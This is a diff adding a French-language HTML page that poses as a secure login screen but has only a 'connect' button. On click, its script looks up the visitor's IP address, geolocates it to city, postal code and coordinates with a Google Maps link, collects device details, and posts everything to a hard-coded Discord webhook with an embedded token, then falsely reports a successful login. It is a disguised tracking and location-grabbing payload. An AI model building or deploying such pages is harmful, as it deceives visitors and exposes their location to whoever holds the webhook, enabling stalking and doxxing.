@@ -1,1 +1,128 @@
 
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Secure</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: white;
+            text-align: center;
+        }
+        
+        .login-container {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            padding: 40px;
+            border-radius: 15px;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.2);
+            max-width: 400px;
+            width: 100%;
+        }
+        
+        .login-btn {
+            background: linear-gradient(to right, #ff758c, #ff7eb3);
+            border: none;
+            color: white;
+            padding: 15px 30px;
+            font-size: 18px;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 5px 15px rgba(255, 117, 140, 0.4);
+            width: 100%;
+            font-weight: bold;
+            letter-spacing: 1px;
+        }
+        
+        .login-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 20px rgba(255, 117, 140, 0.6);
+        }
+        
+        .login-btn:active {
+            transform: translateY(1px);
+        }
+        
+        h1 {
+            margin-bottom: 30px;
+            font-size: 28px;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <h1>Connexion Sécurisée</h1>
+        <button id="loginBtn" class="login-btn">SE CONNECTER</button>
+    </div>
+
+    <script>
+        document.getElementById('loginBtn').addEventListener('click', async function() {
+            try {
+                // Afficher un message pendant le traitement
+                this.textContent = 'Traitement en cours...';
+                this.disabled = true;
+                
+                // Récupérer l'adresse IP
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const { ip } = await ipResponse.json();
+                
+                // Récupérer la localisation
+                const locationResponse = await fetch(`https://ipapi.co/${ip}/json/`);
+                const locationData = await locationResponse.json();
+                
+                // Préparer les données à envoyer
+                const deviceInfo = {
+                    ip: ip,
+                    ville: locationData.city,
+                    region: locationData.region,
+                    pays: locationData.country_name,
+                    code_postal: locationData.postal,
+                    latitude: locationData.latitude,
+                    longitude: locationData.longitude,
+                    lien_google_maps: `https://www.google.com/maps?q=${locationData.latitude},${locationData.longitude}`,
+                    user_agent: navigator.userAgent,
+                    appareil: navigator.platform,
+                    resolution: `${window.screen.width}x${window.screen.height}`,
+                    langue: navigator.language,
+                    fuseau_horaire: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    date_heure: new Date().toISOString()
+                };
+                
+                // Envoyer les données au webhook (REMPLACEZ PAR VOTRE URL)
+                const webhookURL = 'https://discordapp.com/api/webhooks/1393637362151460985/rSzFt_8ovhnAbBIhsmHB33-BbUs8rr6_loE9-ig9feo8TfLeXDgADdDP_aU8TKYJST6Q';
+                
+                const response = await fetch(webhookURL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(deviceInfo)
+                });
+                
+                if (response.ok) {
+                    alert('Connexion réussie!');
+                } else {
+                    throw new Error('Erreur du serveur');
+                }
+                
+            } catch (error) {
+                console.error('Erreur:', error);
+                alert('Une erreur est survenue. Veuillez réessayer.');
+            } finally {
+                this.textContent = 'SE CONNECTER';
+                this.disabled = false;
+            }
+        });
+    </script>
+</body>
+</html>
